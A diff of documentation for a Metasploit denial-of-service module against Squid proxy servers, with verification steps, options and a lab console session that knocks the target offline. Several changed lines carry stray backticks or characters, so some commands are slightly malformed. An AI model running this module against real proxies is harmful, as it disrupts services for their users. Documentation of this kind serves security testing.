@@ -17,34 +17,45 @@ Security bulletin from Squid: https://github.com/squid-cache/squid/security/advi
 ## Verification Steps
 
 1. Start msfconsole
-2. `use auxiliary/dos/http/squid_range_dos.rb`
-3. Set `rhost`
+2. use auxiliary/dos/http/squid_range_dos.rb`
+3. Set `rhost
 4. Set `rport`
 5. run
 
 ## Options
 
-### RequestCount
+### REQUEST_COUNT
 
-RequestCount is both the the number of HTTP requests which are sent to the server in
+REQUEST_COUNT is both the the number of HTTP requests which are sent to the server in
 order to perform the actual Denial of Service (i.e. accepted requests by the server), 
 and the number of requests that are sent to confirm that the Squid host is actually 
 dead.
 
 ## Scenarios
 
+In this scenario the target server is running on the same host as Metasploit (192.168.159.128).
 ```
-msf > use auxiliary/dos/http/squid_range_dos
-
-msf auxiliary(dos/http/squid_range_dos) > show options
+msf6 > use auxiliary/dos/http/squid_range_dos i
+msf6 auxiliary(dos/http/squid_range_dos) > set RHOSTS 192.168.159.128
+RHOSTS => 192.168.159.128
+msf6 auxiliary(dos/http/squid_range_dos) > set SRVHOST 192.168.159.128
+SRVHOST => 192.168.159.128
+msf6 auxiliary(dos/http/squid_range_dos) > show options 
 
 Module options (auxiliary/dos/http/squid_range_dos):
 
-   Name          Current Setting    Required  Description
-   ----          ---------------    --------  -----------
-   RHOSTS        127.0.0.1          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-   RPORT         3128               yes       The target port (TCP)
-   RequestCount  50                 yes       The number of requests to be sent, as well as the number of re-tries to confirm a dead host
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   REQUEST_COUNT  50               yes       The number of requests to be sent, as well as the number of re-tries to confirm a dead host
+   RHOSTS         192.168.159.128  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT          3128             yes       The target port (TCP)
+   SRVHOST        192.168.159.128  yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT        8080             yes       The local port to listen on.
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                         no        The URI to use for this exploit (default is random)
+   VHOST                           no        HTTP server virtual host
 
 
 Auxiliary action:
@@ -53,21 +64,22 @@ Auxiliary action:
    ----  -----------
    DOS   Perform Denial of Service Against The Target
 
-msf auxiliary(dos/http/squid_range_dos) > set rhost 10.210.1.1
-rhost => 10.210.1.1
-msf auxiliary(dos/http/squid_range_dos) > set rport 3128
-rport => 3128
-msf auxiliary(dos/http/squid_range_dos) > run
-[*] Running module against 10.210.1.1
 
-[*] 10.210.1.1:3128 - Sending 50 DoS requests to 10.210.1.1:3128
-[*] 10.210.1.1:3128 - Sending DoS packet 1 to 10.210.1.1:3128
-[*] 10.210.1.1:3128 - Sending DoS packet 2 to 10.210.1.1:3128
-[*] 10.210.1.1:3128 - Sending DoS packet 3 to 10.210.1.1:3128
-[*] 10.210.1.1:3128 - Sending DoS packet 4 to 10.210.1.1:3128
-[*] 10.210.1.1:3128 - Sending DoS packet 5 to 10.210.1.1:3128
-[+] 10.210.1.1:3128 - DoS completely successful
+msf6 auxiliary(dos/http/squid_range_dos) > run
+[*] Running module against 192.168.159.128
+
+[*] Sending 50 DoS requests to 192.168.159.128:3128
+[*] Using URL: http://192.168.159.128:8080/Sv2fFH3gmGeN4VC
+[*] Sent DoS request 1 to 192.168.159.128:3128
+[*] Sent DoS request 2 to 192.168.159.128:3128
+[*] Sent DoS request 3 to 192.168.159.128:3128
+[*] Sent DoS request 4 to 192.168.159.128:3128
+[*] Sent DoS request 5 to 192.168.159.128:3128
+[*] Sent DoS request 6 to 192.168.159.128:3128
+[+] DoS completely successful.
+[*] Server stopped.
 [*] Auxiliary module execution completed
+msf6 auxiliary(dos/http/squid_range_dos) >
 ```
 
 At this point, the target Squid server should be completely inaccessible: all children 
